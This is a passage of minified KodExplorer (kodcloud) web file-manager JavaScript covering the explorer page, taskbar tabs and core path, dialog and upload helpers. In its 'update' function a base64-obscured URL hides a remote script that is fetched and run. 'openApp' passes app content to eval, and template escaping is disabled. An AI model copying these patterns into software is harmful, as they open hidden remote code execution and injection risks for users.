/*! power by kodcloud ver4.24(2017-10-10) [build 1507617869905] */
define("app/src/explorer/main", ["lib/jquery-lib", "lib/util", "lib/ztree/ztree", "lib/contextMenu/jquery-contextMenu", "lib/artDialog/jquery-artDialog", "../../common/taskTap", "../../common/core", "../../common/rightMenuExtence", "../../app/appBase", "../../app/editor", "../../app/openWith", "../../app/html", "../../common/rightMenu", "./ui", "./fileContent", "../../common/tree", "../../path/pathOperate", "../../path/clipboard", "../../path/search", "../../path/path", "./fileLight", "./fileSelect", "./fileListResize", "./headerAddress", "./options"], function(e) {
    Config = {
        BodyContent: ".bodymain",
        FileBoxSelector: ".bodymain .file-continer",
        FileBoxClass: ".bodymain .file-continer .file",
        FileBoxClassName: "file",
        FileBoxTittleClass: ".bodymain .file-continer .title",
        SelectClass: ".bodymain .file-continer .file.select",
        SelectClassName: "select",
        TypeFolderClass: "folder-box",
        TypeFileClass: "file-box",
        HoverClassName: "hover",
        TreeId: "folder-list-tree",
        pageApp: "explorer",
        treeAjaxURL: "explorer/treeList&app=explorer",
        AnimateTime: 200
    }, e("lib/jquery-lib"), e("lib/util"), e("lib/ztree/ztree"), e("lib/contextMenu/jquery-contextMenu"), e("lib/artDialog/jquery-artDialog"), TaskTap = e("../../common/taskTap"), core = e("../../common/core"), rightMenu = e("../../common/rightMenu"), ui = e("./ui"), ui.tree = e("../../common/tree"), ui.path = e("../../path/path"), ui.fileLight = e("./fileLight"), ui.fileSelect = e("./fileSelect"), ui.fileListResize = e("./fileListResize"), ui.headerAddress = e("./headerAddress"), ui.options = e("./options"), $(document).ready(function() {
        function t(e) {
            var t = RegExp("(^|&)" + e + "=([^&]*)(&|$)"),
                a = window.location.search.substr(1).match(t);
            return null != a ? unescape(a[2]) : null
        }
        rightMenu.initExplorer(), core.init(), ui.init(), ui.tree.init(), ui.fileLight.init(), ui.fileSelect.init(), ui.headerAddress.init(), TaskTap.init(), ui.fileListResize.init(), ui.fileListResize.initFileSize(), ui.options.init(), $(".init-loading").fadeOut(450).addClass("pop_fadeout"), e.async("lib/webuploader/webuploader-min", function() {
            core.uploadInit()
        }), "fileList" == t("type") && ($(".menu-theme-list").remove(), $(".tools .tools-left").remove(), $(".header-middle").prependTo(".tools").css("padding-top", "3px"), $("#yarnball").addClass("btn-left-radius"))
    })
}), define("app/common/taskTap", [], function() {
    var e = {},
        t = "",
        a = 160,
        i = function() {
            $(".task-tab .tab").die("mouseenter").live("mouseenter", function() {
                $(this).hasClass("this") || $(this).addClass("hover")
            }).die("mouseleave").live("mouseleave", function() {
                $(this).removeClass("hover")
            })
        },
        n = function(e) {
            var t = e.attr("id"),
                a = $.dialog.list[t];
            if (void 0 == a) return c(t), void 0;
            var i = $("." + t);
            "hidden" == i.css("visibility") ? a.display(!0).zIndex() : i.hasClass("aui-state-focus") ? a.display(!1) : a.zIndex()
        },
        o = function() {
            var e, t, i, o, s = !1,
                r = !1,
                l = 0,
                c = 0,
                d = 0,
                p = 0,
                f = 0,
                u = 0;
            $(".task-tab .tab").die("mousedown").live("mousedown", function(t) {
                1 == t.which && (e = $(this), h(t), this.setCapture && this.setCapture(), $(document).mousemove(function(e) {
                    m(e)
                }), $(document).one("mouseup", function(t) {
                    g(), this.releaseCapture && this.releaseCapture(), 10 > Math.abs(t.pageX - l) && n(e)
                }))
            });
            var h = function(a) {
                    s = !0, r = !0, l = a.pageX, $tab_parent = $(".task-tab"), t = $(".task-tab .tab"), $(".tasktab-dragging").remove(), i = e.clone().addClass("tasktab-dragging").prependTo("body"), p = $sizeInt(t.css("margin-right")), f = $tab_parent.width(), u = $tab_parent.get(0).getBoundingClientRect().left, u += $(window).scrollLeft(), c = e.get(0).getBoundingClientRect().left, d = $sizeInt(t.css("width"));
                    var n = e.get(0).getBoundingClientRect().top - $sizeInt(e.css("margin-top")),
                        o = a.clientX - l + c;
                    $("body").prepend("<div class='dragMaskView'></div>"), i.css({
                        width: d + "px",
                        top: n,
                        left: o
                    }), e.css("opacity", 0)
                },
                m = function(a) {
                    if (r) {
                        window.getSelection ? window.getSelection().removeAllRanges() : document.selection.empty(), 0 == s && h(a);
                        var n = a.clientX - l + c;
                        u > n || n > u + f - d || (i.css("left", n), t.each(function() {
                            var t = $(this).get(0).getBoundingClientRect().left;
                            if (n > t && t + d / 2 + p > n) {
                                if (e.attr("id") == $(this).attr("id")) return;
                                v($(this).attr("id"), "left")
                            }
                            if (n > t - d / 2 + p && t > n) {
                                if (e.attr("id") == $(this).attr("id")) return;
                                v($(this).attr("id"), "right")
                            }
                        }))
                    }
                },
                v = function(i, n) {
                    if (!e.is(":animated") || o != i) {
                        o = i, e.stop(!0, !0), $(".insertTemp").remove(), t = $(".task-tab .tab");
                        var s = e.width(),
                            r = $(".task-tab #" + i),
                            l = e.clone(!0).insertAfter(e).css({
                                "margin-right": "0px",
                                border: "none"
                            }).addClass("insertTemp");
                        "left" == n ? e.after(r).css("width", "0px") : (e.before(r).css("width", "0px"), r.before(l)), e.animate({
                            width: s + "px"
                        }, a), l.animate({
                            width: "0px"
                        }, a, function() {
                            $(this).remove(), t = $(".task-tab .tab")
                        })
                    }
                },
                g = function() {
                    r = !1, s = !1, startTime = 0, $(".dragMaskView").remove(), void 0 != i && (c = e.get(0).getBoundingClientRect().left, i.animate({
                        left: c + "px"
                    }, a, function() {
                        e.css("opacity", 1), $(this).remove()
                    }))
                }
        },
        s = function(e) {
            var t = 110,
                i = t,
                n = t + 12,
                o = $(".task-tab .tab"),
                s = $(".task-tab .tabs").width() - 10,
                r = o.length,
                l = Math.floor(s / n);
            switch (r > l && (i = Math.floor(s / r) - 12), e) {
                case "add":
                    $(".task-tab .tabs .this").css("width", "0").animate({
                        width: i + "px"
                    }, a);
                case "close":
                    o.animate({
                        width: i + "px"
                    }, a);
                    break;
                case "resize":
                    o.css("width", i + "px");
                    break;
                default:
            }
        },
        r = function(t, a) {
            $(".task-tab").removeClass("hidden");
            var i = a.replace(/<[^>]+>/g, ""),
                n = '<div class="tab menu-taskbar" id="' + t + '" title="' + i + '">' + a + "</div>";
            $(n).insertBefore(".task-tab .last"), s("add"), e[t] = {
                id: t,
                name: name
            }
        },
        l = function(e) {
            $(".task-tab .this").removeClass("this"), $(".task-tab #" + e).addClass("this"), t = e
        },
        c = function(t) {
            $(".task-tab #" + t).animate({
                width: 0
            }, a, function() {
                if ($(".task-tab #" + t).remove(), s("close"), 0 == $(".tabs .tab").length && !core.isApp("desktop")) {
                    var e = 31;
                    $(".task-tab").animate({
                        bottom: "-" + e + "px"
                    }, 200, 0, function() {
                        $(this).css({
                            bottom: "0px"
                        }).addClass("hidden")
                    })
                }
            }), delete e[t]
        },
        d = function() {
            $('<i class="menu-taskbar"></i>').appendTo("#rightMenu"), $.contextMenu({
                zIndex: 9999,
                selector: ".menu-taskbar",
                items: {
                    "quit-others": {
                        name: LNG.close_others,
                        className: "quit-others",
                        icon: "remove-circle",
                        accesskey: "o"
                    },
                    quit: {
                        name: LNG.close,
                        className: "quit",
                        icon: "remove",
                        accesskey: "q"
                    }
                },
                callback: function(e, t) {
                    var a = t.$trigger.attr("id"),
                        i = $.dialog.list[a];
                    switch (e) {
                        case "quit-others":
                            $.each($.dialog.list, function(e, t) {
                                a != e && t.close()
                            });
                            break;
                        case "quit":
                            i.close()
                    }
                }
            })
        },
        p = function() {
            $.contextMenu({
                zIndex: 9999,
                selector: ".task-tab",
                items: {
                    closeAll: {
                        name: LNG.dialog_close_all,
                        icon: "remove-circle",
                        accesskey: "q"
                    },
                    showAll: {
                        name: LNG.dialog_display_all,
                        icon: "th-large",
                        accesskey: "s"
                    },
                    hideAll: {
                        name: LNG.dialog_min_all,
                        icon: "remove",
                        accesskey: "h"
                    }
                },
                callback: function(e, t) {
                    var a = t.$trigger.attr("id");
                    switch ($.dialog.list[a], e) {
                        case "showAll":
                            $.each($.dialog.list, function(e, t) {
                                t.display(!0)
                            });
                            break;
                        case "hideAll":
                            $.each($.dialog.list, function(e, t) {
                                t.display(!1)
                            });
                            break;
                        case "closeAll":
                            $.each($.dialog.list, function(e, t) {
                                t.close()
                            });
                            break;
                        default:
                    }
                }
            })
        };
    return {
        add: r,
        focus: l,
        close: c,
        init: function() {
            var e = '<div class="task-tab"><div class="tabs"><div class="last" style="clear:both;"></div></div></div>';
            $(e).appendTo("body"), core.isApp("desktop") || $(".task-tab").addClass("hidden"), $(window).bind("resize", function() {
                s("resize")
            }), i(), d(), p(), o()
        }
    }
}), define("app/common/core", ["./rightMenuExtence", "../app/appBase", "../app/editor", "../app/openWith", "../app/html"], function(require, exports) {
    tplUpload = require("./tpl/upload.html"), tplFormMake = require("./tpl/formMake.html");
    var tools = require("./core.tools"),
        upload = require("./core.upload"),
        api = require("./core.api"),
        playSound = require("./core.playSound"),
        formMake = require("./core.formMake");
    require("./rightMenuExtence"), kodApp = require("../app/appBase"), require("../app/editor"), require("../app/openWith"), require("../app/html"), pathHashEncode = function(e) {
        return hashEncode(e)
    }, pathHashDecode = function(e) {
        return hashDecode(e)
    };
    var initTemplate = function() {
            window.require = require, template.config || (template.config = function(e, t) {
                template.defaults[e] = t
            }, template.helper = function(e, t) {
                template.defaults.imports[e] = t
            }), template.config("escape", !1), template.config("compress", !0), template.helper("kod", {
                $: $,
                window: window,
                log: console.log,
                core: core,
                pathTools: window.pathTools,
                inArray: inArray
            }), template.defaults.imports.pathTools = window.pathTools, template.defaults.escape = !1, "_dev" == G.environment ? (template.defaults.cache = !1, template.defaults.minimize = !1, template.defaults.compileDebug = !0) : (template.defaults.cache = !0, template.defaults.minimize = !0, template.defaults.compileDebug = !1)
        },
        initFirst = function() {
            initTemplate(), "undefined" != typeof G && (1 != G.isRoot && $(".menu-system-setting").remove(), G.isRoot || core.authCheck("systemMember.get") || 1 == core.authCheck("systemGroup.get") || $(".menu-system-group").remove(), G.userConfig && "0" == G.userConfig.animateOpen && ($.dialog.defaults.animate = !1), resetHost()), $("html").bind("click", function(e) {
                if (0 == $(e.target).parents(".context-menu-list").length) try {
                    $.contextMenu.hidden()
                } catch (e) {}
            }), $("body").click(function() {
                ShareData.frameTop("", function(e) {
                    self != e && e.$("body").trigger("click")
                })
            }), $.dialog.defaults.animate && loadRipple(["a", "button", ".ripple-item", ".context-menu-item", "#picker", ".menuShareButton", ".menu-recycle-button", ".section .list"], [".disabled", ".disable", ".ztree", ".disable-ripple"]), $("a,img").attr("draggable", "false"), $.ajaxSetup({
                headers: {
                    "X-CSRF-TOKEN": Cookie.get("X-CSRF-TOKEN")
                }
            }), $(".common-footer [forceWap]").click(function() {
                var e = $(this).attr("forceWap");
                Cookie.set("forceWap", e), window.location.reload()
            }), core.setSkinDiy(), core.tools.init();
            for (var e = 0; window.kodReady.length > e; e++) try {
                window.kodReady[e]()
            } catch (t) {
                console.error("kodReady error:", t)
            }
            Hook.trigger("kodReady.end"), titleTips()
        },
        resetHost = function() {
            var e = window.location,
                t = e.port ? ":" + e.port : "";
            G.webHost = e.protocol + "//" + e.hostname + t + "/", G.appHost = rtrim(G.webHost, "/") + e.pathname.replace("index.php", "") + "index.php?", G.appRoot = rtrim(G.webHost, "/") + e.pathname.replace("index.php", ""), "1" == G.settings.paramRewrite && (G.appHost = G.appHost.replace("index.php?", "index.php/"))
        },
        titleTips = function() {
            isWap() || require.async(["lib/poshytip/jquery.poshytip.js", "lib/poshytip/skin.css"], function() {
                var e = $("[title]");
                e.poshytip({
                    className: "ptips-skin",
                    liveEvents: !0,
                    slide: !1,
                    alignTo: "cursor",
                    alignX: "right",
                    alignY: "bottom",
                    showAniDuration: 150,
                    hideAniDuration: 200,
                    offsetY: 10,
                    offsetX: 20,
                    showTimeout: function() {
                        var e = 1500;
                        return $(this).attr("title-timeout") && (e = parseInt($(this).attr("title-timeout"))), e
                    },
                    content: function() {
                        var e = $(this).data("title.poshytip");
                        if ($(this).attr("title-data")) {
                            var t = $($(this).attr("title-data"));
                            e = t.is("input") || t.is("textarea") ? t.val() : t.html()
                        }
                        return e = e ? e : "", e.replace(/\n/g, "<br/>")
                    }
                }), $("body").bind("mousedown", function() {
                    $(".ptips-skin").remove(), $.setStyle("body .ptips-skin{display:none !important;}", "ptips-title")
                }).bind("mouseup", function() {
                    $.setStyle("", "ptips-title")
                }), $("input,textarea").live("focus", function() {
                    $(e).poshytip("hide"), $(".ptips-skin").remove()
                })
            })
        };
    return {
        init: initFirst,
        serverDwonload: upload.serverDwonload,
        upload: upload.upload,
        uploadInit: upload.init,
        playSound: playSound.playSound,
        playSoundFile: playSound.playSoundFile,
        tools: tools,
        api: api,
        formMake: formMake,
        getPathIcon: function(e, t) {
            if (t = void 0 == t ? "" : t, "string" == $.type(e)) {
                var a = trim(trim(e), "/");
                if (e = {}, "{" != a.substring(0, 1) || a.split("/").length > 1) return {
                    icon: "",
                    name: ""
                };
                e.pathType = a.match(/\{.*\}/), e.id = a.split(":")[1]
            }
            var i = {};
            i[G.KOD_USER_SHARE] = {
                icon: "user-self",
                name: LNG.my_share
            }, i[G.KOD_GROUP_PATH] = {
                icon: "group-self-owner"
            }, i[G.KOD_GROUP_SHARE] = {
                icon: "group-guest"
            }, i[G.KOD_USER_SELF] = {
                icon: "user-self"
            }, i[G.KOD_USER_RECYCLE] = {
                icon: "recycle",
                name: LNG.recycle
            }, i[G.KOD_USER_FAV] = {
                icon: "tree-fav",
                name: LNG.fav
            }, i[G.KOD_GROUP_ROOT_SELF] = {
                icon: "group-self-root",
                name: LNG.my_kod_group
            }, i[G.KOD_GROUP_ROOT_ALL] = {
                icon: "group-root",
                name: LNG.kod_group
            };
            var n = i[e.pathType];
            return e.pathType == G.KOD_USER_SHARE && G.userID != e.id ? n = {
                icon: "user",
                name: t
            } : e.pathType == G.KOD_GROUP_PATH && "owner" == e.role && (n = {
                icon: "group-self-owner"
            }), void 0 == n && (n = {
                icon: "",
                name: ""
            }), void 0 == n.name && (n.name = t), n
        },
        isSystemPath: function(e) {
            var e = trim(trim(e), "/");
            if (void 0 == e || "{" != e.substring(0, 1) || e.split("/").length > 1) return !1;
            var t = e.match(/\{.*\}/),
                a = [G.KOD_USER_SHARE, G.KOD_GROUP_SHARE, G.KOD_USER_RECYCLE, G.KOD_USER_FAV, G.KOD_GROUP_ROOT_SELF, G.KOD_GROUP_ROOT_ALL];
            return -1 !== $.inArray(t[0], a) ? !0 : !1
        },
        pathPre: function(e) {
            if (e = trim(trim(e), "/"), void 0 == e || "{" != e.substring(0, 1)) return "";
            var t = e.match(/\{.*\}/);
            return t[0]
        },
        contextmenu: function(e) {
            try {
                $.contextMenu.hidden()
            } catch (t) {}
            var t = e || window.event;
            return t ? t && $(t.target).is("textarea") || $(t.target).is("input") || $(t.target).is("p") || $(t.target).is("pre") || 0 != $(t.target).parents(".can-right-menu").length || 0 != $(t.target).parents(".topbar").length || 0 != $(t.target).parents(".edit-body").length || 0 != $(t.target).parents(".aui-state-focus").length ? !0 : !1 : !0
        },
        pathThis: function(e) {
            if (!e || "/" == e) return "";
            var t = rtrim(this.pathClear(e), "/"),
                a = t.lastIndexOf("/"),
                i = t.substr(a + 1);
            if (0 == i.search("fileProxy")) {
                i = urlDecode(i.substr(i.search("&path=")));
                var n = i.split("/");
                i = n[n.length - 1], "" == i && (i = n[n.length - 2])
            }
            return i
        },
        pathClear: function(e) {
            if (!e) return "";
            var t = e.replace(/\\/g, "/");
            return t = t.replace(/\/+/g, "/"), t = t.replace(/\.+\//g, "/")
        },
        pathFather: function(e) {
            var t = rtrim(this.pathClear(e), "/"),
                a = t.lastIndexOf("/");
            return t.substr(0, a + 1)
        },
        pathExt: function(e) {
            var t = trim(e, "/");
            return -1 != t.lastIndexOf("/") && (t = t.substr(t.lastIndexOf("/") + 1)), -1 != t.lastIndexOf(".") ? t.substr(t.lastIndexOf(".") + 1).toLowerCase() : t.toLowerCase()
        },
        pathUrlEncode: function(e) {
            if (!e) return "";
            var t = urlEncode(e);
            return t = t.replace(/%2F/g, "/")
        },
        path2url: function(e, t) {
            if ("http" == e.substr(0, 4)) return e;
            void 0 == t && (t = !0);
            var a, i = this.pathClear(e);
            return G.isRoot && t && i.substring(0, G.webRoot.length) == G.webRoot ? a = G.webHost + this.pathUrlEncode(i.replace(G.webRoot, "")) : (a = G.appHost + "explorer/fileProxy&accessToken=" + G.accessToken + "&path=" + urlEncode(i), G.sharePage !== void 0 && (a = G.appHost + "share/fileProxy&user=" + G.user + "&sid=" + G.sid + "&path=" + urlEncode(i), i.substr(0, G.KOD_USER_SHARE.length) == G.KOD_USER_SHARE && (a = G.appHost + "share/fileProxy&path=" + urlEncode(i)))), a
        },
        pathCommon: function(e) {
            if ("http" == e.substr(0, 4)) return urlEncode(e);
            if (e.substr(0, G.KOD_USER_SHARE.length) == G.KOD_USER_SHARE) return urlEncode(e);
            var t = this.pathClear(e),
                a = urlEncode(t);
            return G.sharePage !== void 0 && (a = urlEncode(G.KOD_USER_SHARE + ":" + G.user + "/" + G.shareInfo.name + t)), a
        },
        isApp: function(e) {
            if ("undefined" == typeof Config) return !1;
            var t = Config.pageApp;
            return "string" == typeof e ? t == e : $.isArray(e) ? -1 !== $.inArray(t, e) ? !0 : !1 : !1
        },
        pathReadable: function(e) {
            if ("object" != typeof G.jsonData) return !0;
            for (var t = G.jsonData.fileList, a = 0; t.length > a; a++)
                if (t[a].path == e) return void 0 == t[a].isReadable || 1 == t[a].isReadable ? !0 : !1;
            t = G.jsonData.folderList;
            for (var a = 0; t.length > a; a++)
                if (t[a].path == e) return void 0 == t[a].isReadable || 1 == t[a].isReadable ? !0 : !1;
            return !0
        },
        pathCurrentWriteable: function() {
            return core.isApp("editor") ? !1 : G.jsonData.info ? G.jsonData.info.canUpload : !1
        },
        authCheck: function(e, t) {
            return G.isRoot ? !0 : AUTH.hasOwnProperty(e) && AUTH[e] ? !0 : (t && (t = t === !0 ? LNG.no_permission : t, Tips.tips(t, !1)), !1)
        },
        ajaxError: function(e, t, a) {
            console.log(e, t, a);
            var i = e.responseText,
                n = $.dialog.list.ajaxErrorDialog;
            return Tips.close(LNG.system_error, !1), "<!--user login-->" == i.substr(0, 17) ? (setTimeout(function() {
                var e = ShareData.frameTop();
                e.location.reload()
            }, 500), void 0) : (0 == e.status && "" == i && (i = "网络连接错误 (net::ERR_CONNECTION_RESET)，连接已重置<br/>请联系主机商或网管，检查防火墙配置！"), i = '<div class="ajaxError">' + i + "</div>", n ? n.content(i) : $.dialog({
                id: "ajaxErrorDialog",
                padding: 0,
                width: "60%",
                height: "50%",
                fixed: !0,
                resize: !0,
                ico: core.icon("error"),
                title: "ajax error",
                content: i
            }), void 0)
        },
        fileGet: function(e, t, a) {
            var i = "filename";
            "http" == e.substr(0, 4) && (i = "fileUrl");
            var n = G.appHost + "editor/fileGet&" + i + "=" + urlEncode(e);
            G.sharePage !== void 0 && (n = G.appHost + "share/fileGet&user=" + G.user + "&sid=" + G.sid + "&" + i + "=" + urlEncode(e)), (e.indexOf("editor/fileGet&") >= 0 || e.indexOf("share/fileGet&") >= 0) && (n = e), $.ajax({
                url: n,
                dataType: "json",
                error: function(e, t, i) {
                    core.ajaxError(e, t, i), "function" == typeof a && a()
                },
                success: function(e) {
                    e.code && "function" == typeof t && (1 == e.data.base64 && (e.data.content = base64Decode(e.data.content)), t(e.data.content, e, n)), e.code || "function" == typeof a && a(e.data)
                }
            })
        },
        fileInfo: function(e, t) {
            var a = G.appHost + "explorer/pathInfo";
            G.sharePage !== void 0 && (a = G.appHost + "share/pathInfo&user=" + G.user + "&sid=" + G.sid), $.ajax({
                url: a,
                type: "POST",
                dataType: "json",
                data: e,
                error: core.ajaxError,
                success: function(e) {
                    "function" == typeof t && t(e)
                }
            })
        },
        fileLink: function(e, t) {
            if (e = this.pathClear(e), G.isRoot && e.substring(0, G.webRoot.length) == G.webRoot) {
                var a = G.webHost + this.pathUrlEncode(e.replace(G.webRoot, ""));
                return "function" == typeof t && t(a), void 0
            }
            var i = 'dataArr=[{"type":"file","path":"' + urlEncode(e) + '"}]&viewPage=1';
            this.fileInfo(i, function(e) {
                var a = e.code ? e.data.downloadPath : !1;
                return a ? ("function" == typeof t && t(a), void 0) : (Tips.tips(LNG.no_permission_action + "==>" + LNG.group_role_pathinfo, !1), void 0)
            })
        },
        setting: function(e) {
            void 0 == e && (e = G.isRoot ? "system" : "user");
            var t = "85%",
                a = "85%";
            isWap() && (t = "100%", a = "100%"), ShareData.frameTop("Opensetting_mode") ? ShareData.frameTop("Opensetting_mode", function(t) {
                t.Setting.setGoto(e), $.dialog.list.setting_mode.display(!0)
            }) : $.dialog.open(G.appHost + "setting#" + e, {
                id: "setting_mode",
                fixed: !0,
                ico: core.icon("setting"),
                resize: !0,
                title: LNG.setting,
                width: t,
                height: t
            })
        },
        copyright: function() {
            var e = require("./tpl/copyright.html"),
                t = template.compile(e),
                a = ShareData.frameTop();
            a.art.dialog({
                id: "dialog-copyright",
                bottom: 0,
                right: 0,
                simple: !0,
                resize: !1,
                title: LNG.about,
                width: 425,
                padding: "0",
                fixed: !0,
                content: t({
                    LNG: LNG,
                    G: G
                })
            }), a.$(".dialog-copyright").addClass("animated-700 zoomIn")
        },
        qrcode: function(e, t) {
            "./" == e.substr(0, 2) && (e = G.appHost + e.substr(2));
            var a = G.appHost + "user/qrcode&url=" + quoteHtml(urlEncode(e)),
                i = "<a href='" + quoteHtml(e) + "' s='" + e + "' target='_blank'><img src='" + a + "' style='border:1px solid #eee;'/></a>";
            $.dialog({
                follow: t,
                fixed: !0,
                resize: !1,
                title: LNG.qrcode,
                padding: 30,
                content: i
            })
        },
        appStore: function() {
            var e = ShareData.frameTop();
            e.$.dialog.open(G.appHost + "app", {
                id: "app_store",
                fixed: !0,
                ico: core.icon("app-store"),
                resize: !0,
                title: LNG.app_store,
                width: "80%",
                height: "80%"
            })
        },
        openWindow: function(e, t, a, i) {
            t = t ? t : LNG.tips, a = a ? a : "80%", i = i ? i : "70%", isWap() && (a = "100%", i = "100%");
            var n = ShareData.frameTop(),
                o = n.$.dialog.open(e, {
                    ico: "",
                    title: t,
                    fixed: !0,
                    resize: !0,
                    width: a,
                    height: i
                });
            return o
        },
        openWindowFull: function(e, t) {
            return core.openWindow(e, t, "100%", "100%")
        },
        openWindowBig: function(e, t) {
            return core.openWindow(e, t, "90%", "90%")
        },
        openDialog: function(e, t, a, i) {
            if (e) {
                void 0 == i && (i = "openDialog" + UUID());
                var n = "<iframe frameborder='0' name='Open" + i + "' src='" + htmlEncode(e) + "' style='width:100%;height:100%;border:0;'></iframe>",
                    o = ShareData.frameTop(),
                    s = o.$.dialog({
                        id: i,
                        fixed: !0,
                        title: a,
                        ico: t,
                        width: "80%",
                        height: "75%",
                        padding: 0,
                        content: n,
                        resize: !0
                    });
                return s
            }
        },
        openApp: function(app) {
            if ("url" == app.type) {
                var icon = app.icon; - 1 == app.icon.search(G.staticPath) && "http" != app.icon.substring(0, 4) && (icon = G.staticPath + "images/file_icon/icon_app/" + app.icon), "number" != typeof app.width && -1 === app.width.search("%") && (app.width = parseInt(app.width)), "number" != typeof app.height && -1 === app.height.search("%") && (app.height = parseInt(app.height)), app.width || (app.width = "90%"), app.height || (app.height = "70%");
                var dialog_info = {
                        resize: app.resize,
                        fixed: !0,
                        ico: core.iconSrc(icon),
                        title: app.name.replace(".oexe", ""),
                        width: app.width,
                        height: app.height,
                        simple: app.simple,
                        padding: 0
                    },
                    top = ShareData.frameTop();
                "swf" == core.pathExt(app.content) ? (dialog_info.content = core.createFlash(app.content), top.$.dialog(dialog_info)) : top.$.dialog.open(app.content, dialog_info)
            } else {
                var exec = app.content;
                eval("{" + exec + "}")
            }
        },
        update: function() {
            setTimeout(function() {
                var e = base64Decode("Ly9zdGF0aWMua29kY2xvdWQuY29tL3VwZGF0ZS9tYWluNC5qcw==") + "?a=" + UUID();
                require.async(e, function(e) {
                    try {
                        e.todo("check")
                    } catch (t) {}
                })
            }, 200)
        },
        openPath: function(e) {
            core.isApp("explorer") ? ui.path.list(e, "tips") : core.explorer(e)
        },
        explorer: function(e, t) {
            void 0 == e && (e = ""), void 0 == t && (t = core.pathThis(e));
            var a = G.appHost + "explorer&type=iframe&path=" + e;
            G.sharePage !== void 0 && (a = G.appHost + "share/folder&type=iframe&user=" + G.user + "&sid=" + G.sid + "&path=" + e);
            var i = ShareData.frameTop(),
                n = i.$.dialog.open(a, {
                    className: "dialogExplorer",
                    resize: !0,
                    fixed: !0,
                    ico: core.icon("folder"),
                    title: t,
                    width: "80%",
                    height: "75%"
                }),
                o = 20 * i.$(".dialogExplorer").length;
            n.DOM.wrap.css({
                left: "+=" + o + "px",
                top: "+=" + o + "px"
            })
        },
        explorerCode: function(e) {
            void 0 == e && (e = "");
            var t = G.appHost + "editor&project=" + e;
            G.sharePage !== void 0 && (t = G.appHost + "share/codeRead&user=" + G.user + "&sid=" + G.sid + "&project=" + e), window.open(t)
        },
        setSkinFinished: function() {
            var e = $(".link-theme-loaded").attr("src");
            e && ($("#link-theme-style").attr("href", e), $(".link-theme-loaded").remove())
        },
        setSkin: function(e) {
            LocalData.set("theme", e), G.userConfig.theme = e;
            var t = G.staticPath + "style/skin/" + e + ".css?ver=" + G.version;
            t != $("#link-theme-style").attr("href") && $("body").append('<img src="' + t + '" onload="core.setSkinFinished();" onerror="core.setSkinFinished();" class="hidden link-theme-loaded">'), this.setSkinDiy()
        },
        setSkinDiy: function() {
            if (G.userConfig) {
                var e = LocalData.get("theme"),
                    t = "kodStyleDiy",
                    a = LocalData.getConfig(t);
                "object" != typeof a && "object" == typeof G.userConfig.themeDIY && (a = G.userConfig.themeDIY), "object" != typeof a && (a = {
                    bgBlur: 1,
                    bgImage: G.staticPath + "images/wall_page/9.jpg",
                    bgType: "color",
                    startColor: "#456",
                    endColor: "#000",
                    colorRotate: "200"
                }, LocalData.setConfig(t, a)), G.userConfig.themeDIY = a;
                var i = "";
                if ("diy" == e && a) {
                    var n = require("./tpl/themeDIY.html"),
                        o = template.compile(n);
                    i = o(a)
                }
                $.setStyle(i, t)
            }
        },
        editorFull: function() {
            var e = $("iframe[name=OpenopenEditor]");
            e.toggleClass("frame-fullscreen")
        },
        language: function(e) {
            Cookie.set("kodUserLanguage", e, 8760), window.location.reload()
        },
        fullScreen: function() {
            "true" == $("body").attr("fullScreen") && core.exitfullScreen(), $("body").attr("fullScreen", "true");
            var e = ShareData.frameTop(),
                t = e.document.documentElement;
            t.requestFullscreen ? t.requestFullscreen() : t.mozRequestFullScreen ? t.mozRequestFullScreen() : t.webkitRequestFullScreen && t.webkitRequestFullScreen()
        },
        exitfullScreen: function() {
            $("body").attr("fullScreen", "false"), document.exitFullscreen ? document.exitFullscreen() : document.mozCancelFullScreen ? document.mozCancelFullScreen() : document.webkitCancelFullScreen && document.webkitCancelFullScreen()
        },
        createFlash: function(e, t, a) {
            var i = UUID();
            (a === void 0 || "" == a) && (a = i);
            var n = "";
            $.browser.msie && 9 > parseInt($.browser.version) && (n = 'classid="clsid:d27cdb6e-ae6d-11cf-96b8-444553540000"');
            var o = '<object type="application/x-shockwave-flash" class="' + i + '" ' + n + ' name="' + a + '" id="' + a + '" data="' + e + '" width="100%" height="100%" tabindex="-1" >' + '<param name="movie" value="' + e + '"/>' + '<param name="allowfullscreen" value="true" />' + '<param name="allowscriptaccess" value="always" />' + '<param name="allowScriptAccess" value="always" />' + '<param name="flashvars" value="' + t + '" />' + '<param name="wmode" value="transparent" />' + '</object><div class="aui-loading" id="' + i + '_loading"><span>loading..</span></div>';
            return setTimeout(function() {
                var e = $("." + i);
                if (1 != e.length) {
                    var t = ShareData.frameTop();
                    e = t.$("." + i)
                }
                if (1 == e.length) var a = 0,
                    n = e[0],
                    o = setInterval(function() {
                        try {
                            a++, 100 == Math.floor(n.PercentLoaded()) ? (e.next(".aui-loading").remove(), clearInterval(o), o = null) : a > 100 && (e.next(".aui-loading").remove(), clearInterval(o), o = null)
                        } catch (t) {}
                    }, 100)
            }, 50), o
        },
        userSpaceHtml: function(e) {
            var t = e.split("/"),
                a = parseFloat(t[0]),
                i = 1073741824 * parseFloat(t[1]),
                n = pathTools.fileSize(parseFloat(t[0])),
                o = pathTools.fileSize(i),
                s = n + "/",
                r = 100 * a / i;
            r >= 100 && (r = 100);
            var l = "";
            return r >= 80 && (l = "warning"), 0 == i || isNaN(i) ? (s += LNG.space_tips_full, r = "0%") : (s += o, r += "%"), s = "<div class='space-info-bar'><div class='space-process'><div class='space-process-use " + l + "' style='width:" + r + "'></div></div>" + "<div class='space-info'>" + s + "</div>" + "</div>"
        },
        dateTime: function(e) {
            return date(LNG.time_type, e)
        },
        uploadCheck: function(e, t) {
            return t = void 0 == t ? !0 : t, "share" == G.sharePage ? "1" == G.shareInfo.canUpload : (void 0 == e && (e = "explorer.fileUpload"), !G.isRoot && AUTH.hasOwnProperty(e) && 1 != AUTH[e] ? (t && Tips.tips(LNG.no_permission, !1), !1) : G.jsonData && !G.jsonData.info.canUpload ? (t && (core.isSystemPath(G.thisPath) ? Tips.tips(LNG.path_can_not_action, !1) : Tips.tips(LNG.no_permission_write, !1)), !1) : !0)
        }
    }
